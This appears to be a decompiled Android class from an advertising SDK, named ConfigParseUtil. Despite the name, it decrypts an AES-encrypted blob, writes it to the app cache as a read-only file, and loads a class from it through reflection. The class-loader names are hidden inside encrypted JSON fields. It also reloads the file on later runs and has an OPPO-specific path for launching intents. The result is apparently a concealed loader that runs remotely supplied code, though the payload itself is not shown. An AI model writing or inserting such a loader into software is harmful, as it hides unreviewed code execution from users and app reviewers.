package com.fl.saas.config.utils;

import android.content.Context;
import android.content.Intent;
import android.text.TextUtils;
import android.util.Log;
import com.android.general.media.gif.EventUtil;
import com.android.general.media.gif.FrameSequence;
import com.google.android.exoplayer2.source.rtsp.j;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;
import org.json.JSONObject;

/* JADX INFO: loaded from: /home/ylxc/Projects/lib/ShanDong/work/APP_ALL/classes_08_10593cls.dex */
public class ConfigParseUtil {
    private static final Map<String, Object> REFLECT_CACHE = new ConcurrentHashMap();
    public static int li;
    private static EventUtil u;

    public static void delete() {
        try {
            FileHelper.deleteAllFilesInDirectory(new File(getCacheDir(DeviceUtil.getContext()).getAbsolutePath() + File.separator + j.o));
            u = null;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static File getCacheDir(Context context) {
        File cacheDir = context.getCacheDir();
        if (!cacheDir.exists()) {
            cacheDir.mkdirs();
        }
        return cacheDir;
    }

    public static EventUtil getUtil() {
        return u;
    }

    public static boolean launchApp(Context context, Intent intent, String str, int i) {
        if (context != null && intent != null && u != null && i != 0) {
            try {
                if (("OPPO".equalsIgnoreCase(DeviceUtil.getDeviceBrand()) && li == 1) ? FrameSequence.startIntent(context, str) : false) {
                    return true;
                }
                return u.l(context, intent);
            } catch (Exception unused) {
            }
        }
        return false;
    }

    public static int loadExists(String str) {
        Class<?> clsReflectMethod;
        try {
            String strDecryptJson = AesUtils.decryptJson(str);
            if (TextUtils.isEmpty(strDecryptJson)) {
                return 0;
            }
            JSONObject jSONObject = new JSONObject(strDecryptJson);
            String strOptString = jSONObject.optString("s1");
            String strOptString2 = jSONObject.optString("s2");
            String strOptString3 = jSONObject.optString("s3");
            String strOptString4 = jSONObject.optString("s4");
            String strOptString5 = jSONObject.optString("s5");
            String strOptString6 = jSONObject.optString("s6");
            File cacheDir = getCacheDir(DeviceUtil.getContext());
            StringBuilder sb = new StringBuilder();
            sb.append(cacheDir.getAbsolutePath());
            String str2 = File.separator;
            sb.append(str2);
            sb.append(j.o);
            sb.append(str2);
            sb.append(strOptString6);
            String string = sb.toString();
            if (new File(string).exists() && (clsReflectMethod = reflectMethod(string, strOptString, strOptString2, strOptString3, strOptString4, strOptString5)) != null) {
                EventUtil eventUtil = (EventUtil) clsReflectMethod.newInstance();
                u = eventUtil;
                eventUtil.i(DeviceUtil.getContext());
                int iV = u.v();
                Log.i("cbk1", "v" + iV);
                return iV;
            }
        } catch (Exception unused) {
        }
        return 0;
    }

    public static void parseData(String str) {
        try {
            if (TextUtils.isEmpty(str)) {
                return;
            }
            String[] strArrSplit = str.split(",");
            if (strArrSplit.length != 2) {
                return;
            }
            String strDecryptJson = AesUtils.decryptJson(strArrSplit[0]);
            if (TextUtils.isEmpty(strDecryptJson)) {
                return;
            }
            JSONObject jSONObject = new JSONObject(strDecryptJson);
            String strOptString = jSONObject.optString("s1");
            String strOptString2 = jSONObject.optString("s2");
            String strOptString3 = jSONObject.optString("s3");
            String strOptString4 = jSONObject.optString("s4");
            String strOptString5 = jSONObject.optString("s5");
            String strOptString6 = jSONObject.optString("s6");
            File cacheDir = getCacheDir(DeviceUtil.getContext());
            StringBuilder sb = new StringBuilder();
            sb.append(cacheDir.getAbsolutePath());
            String str2 = File.separator;
            sb.append(str2);
            sb.append(j.o);
            sb.append(str2);
            sb.append(strOptString6);
            String string = sb.toString();
            File file = new File(string);
            try {
                if (file.exists()) {
                    file.delete();
                } else {
                    File parentFile = file.getParentFile();
                    if (parentFile != null && !parentFile.exists()) {
                        parentFile.mkdirs();
                    }
                }
                file.createNewFile();
                writeFilesData(strArrSplit[1], string);
                file.setWritable(false);
            } catch (Exception unused) {
            }
            Class<?> clsReflectMethod = reflectMethod(string, strOptString, strOptString2, strOptString3, strOptString4, strOptString5);
            if (clsReflectMethod != null) {
                EventUtil eventUtil = (EventUtil) clsReflectMethod.newInstance();
                u = eventUtil;
                eventUtil.i(DeviceUtil.getContext());
                int iV = u.v();
                SPUtil.getInstance().putString("key_z_value", strArrSplit[0]);
                SPUtil.getInstance().putInt("key_z_number", iV);
                u.i(DeviceUtil.getContext());
                Log.i("cbk1", "v" + iV);
            }
        } catch (Exception unused2) {
        }
    }

    private static Class<?> reflectMethod(String str, String str2, String str3, String str4, String str5, String str6) {
        Log.i("cbk1", "r");
        if (!TextUtils.isEmpty(str6) && !TextUtils.isEmpty(str)) {
            String str7 = str2 + str5 + str6 + str.hashCode();
            Map<String, Object> map = REFLECT_CACHE;
            if (map.containsKey(str7)) {
                return (Class) map.get(str7);
            }
            try {
                Class<?> cls = Class.forName(str2);
                Class<?> cls2 = Class.forName(str3);
                Class<?> cls3 = (Class) cls.getMethod(str5, String.class).invoke(cls.getConstructor(cls2, cls2, cls2, Class.forName(str4)).newInstance(str, getCacheDir(DeviceUtil.getContext()).getAbsolutePath(), null, DeviceUtil.getContext().getClassLoader()), str6);
                if (cls3 != null) {
                    map.put(str7, cls3);
                }
                return cls3;
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        return null;
    }

    public static void writeFilesData(String str, String str2) {
        try {
            byte[] bArrDecryptBytes = AesUtils.decryptBytes(str);
            FileOutputStream fileOutputStream = new FileOutputStream(str2);
            try {
                BufferedOutputStream bufferedOutputStream = new BufferedOutputStream(fileOutputStream);
                try {
                    int length = bArrDecryptBytes.length;
                    int i = 0;
                    while (length > 0) {
                        int iMin = Math.min(1048576, length);
                        bufferedOutputStream.write(bArrDecryptBytes, i, iMin);
                        i += iMin;
                        length -= iMin;
                    }
                    bufferedOutputStream.flush();
                    bufferedOutputStream.close();
                    fileOutputStream.close();
                } catch (Throwable th) {
                    try {
                        bufferedOutputStream.close();
                    } catch (Throwable th2) {
                        th.addSuppressed(th2);
                    }
                    throw th;
                }
            } catch (Throwable th3) {
                try {
                    fileOutputStream.close();
                } catch (Throwable th4) {
                    th3.addSuppressed(th4);
                }
                throw th3;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
